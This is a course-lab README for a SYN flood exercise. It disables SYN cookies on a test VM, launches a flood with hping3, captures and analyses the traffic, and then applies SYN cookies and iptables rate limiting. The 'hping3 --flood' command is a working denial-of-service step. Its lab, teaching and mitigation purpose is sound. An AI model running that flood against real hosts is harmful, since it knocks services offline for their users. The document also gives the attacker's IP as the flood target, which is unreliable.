# Task 2: SYN Flood Attack Implementation & Mitigation

## Overview
This project focuses on the implementation and mitigation of a TCP SYN flood attack in a controlled, virtual environment. The objective is to simulate an attack, analyze its impact on TCP connections, and then apply mitigation techniques to observe the difference.

## Task Breakdown
### **Task 1: Implementation of SYN Flood Attack**
In this part, we modify the server's Linux kernel parameters to make it more vulnerable to a SYN flood attack. Then, we generate legitimate traffic followed by a SYN flood attack, capture the network traffic, and analyze the results.

### **Task 2: SYN Flood Attack Mitigation**
After performing the attack, we implement mitigation techniques such as SYN cookies and rate limiting. The same attack experiment is repeated, and the results are compared with the initial scenario.

---

## **Environment Setup**
We use two virtual machines:
- **Attacker:** Kali Linux (IP: 192.168.200.133)
- **Victim Server:** Any Linux-based VM or host

### **Required Tools**
Install necessary tools on both machines:
```bash
sudo apt update && sudo apt install tcpdump tshark hping3 iproute2 net-tools
```

---

## **Task 1: Implementing SYN Flood Attack**

### **1. Configuring the Victim Server**
To make the server vulnerable, we modify kernel parameters:
```bash
sudo sysctl -w net.ipv4.tcp_max_syn_backlog=4096
sudo sysctl -w net.ipv4.tcp_syncookies=0
sudo sysctl -w net.ipv4.tcp_synack_retries=2
```
To make these changes persistent:
```bash
echo "net.ipv4.tcp_max_syn_backlog=4096" | sudo tee -a /etc/sysctl.conf
echo "net.ipv4.tcp_syncookies=0" | sudo tee -a /etc/sysctl.conf
echo "net.ipv4.tcp_synack_retries=2" | sudo tee -a /etc/sysctl.conf
sudo sysctl -p
```

### **2. Running the TCP Server**
Using Netcat:
```bash
nc -l -p 4999
```
Or using Python:
```python
import socket

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(("0.0.0.0", 4999))
server.listen(5)
print("Server listening on port 4999...")

while True:
    conn, addr = server.accept()
    print(f"Connection from {addr}")
    conn.close()
```

### **3. Capturing Network Traffic**
On the attacker machine, start capturing packets:
```bash
sudo tcpdump -i eth0 port 4999 -w syn_flood.pcap
```

### **4. Generating Legitimate Traffic**
```bash
hping3 -S -p 4999 -c 50 192.168.200.133
```
Wait 20 seconds before launching the attack.

### **5. Launching the SYN Flood Attack**
```bash
hping3 -S -p 4999 --flood 192.168.200.133
```
Let it run for 100 seconds, then stop it with `Ctrl+C`.

### **6. Stopping Traffic Capture**
```bash
sudo pkill -f tcpdump
```

### **7. Analyzing the PCAP File**
Extract unique connection details:
```bash
tshark -r syn_flood.pcap -Y "tcp.flags.syn==1" -T fields -e ip.src -e ip.dst -e tcp.srcport -e tcp.dstport -e frame.time_epoch > connections.txt
```
Extract connection closures (FIN-ACK or RESET packets):
```bash
tshark -r syn_flood.pcap -Y "tcp.flags.reset==1 || tcp.flags.fin==1" -T fields -e ip.src -e ip.dst -e tcp.srcport -e tcp.dstport -e frame.time_epoch > closures.txt
```

### **8. Visualizing the Attack Impact**
A Python script processes the data and generates graphs showing connection durations before, during, and after the attack.

---

## **Task 2: SYN Flood Mitigation**
### **1. Applying Mitigation Techniques**

#### **Enabling SYN Cookies**
```bash
sudo sysctl -w net.ipv4.tcp_syncookies=1
```

#### **Rate Limiting SYN Packets**
```bash
sudo iptables -A INPUT -p tcp --syn -m limit --limit 10/s --limit-burst 20 -j ACCEPT
sudo iptables -A INPUT -p tcp --syn -j DROP
```

#### **Dropping Invalid Packets**
```bash
sudo iptables -A INPUT -m state --state INVALID -j DROP
```

### **2. Re-running the Experiment**
The same attack is performed again, and the results are analyzed.

---

## **Results & Analysis**
The PCAP files are analyzed to extract connection start times and durations. A Python script processes the data and generates:
- **Scatter plot** of connection duration vs. start time
- **Box plot** comparing connection durations before, during, and after attack

### **Key Observations:**
- Without mitigation, many connections fail, or their duration is significantly reduced.
- With mitigation, the system remains more resilient, handling connections more effectively.

---

## **Deliverables**
- (Graph: Connection Duration vs. Start Time)
- (Graph: Boxplot Comparison)
- Wireshark screenshots (showing attack success & mitigation effectiveness)
- Python script for data analysis

---

## **Conclusion**
This experiment successfully demonstrates the impact of a SYN flood attack and evaluates the effectiveness of mitigation strategies. The results highlight the importance of proactive security measures to protect servers from denial-of-service attacks.
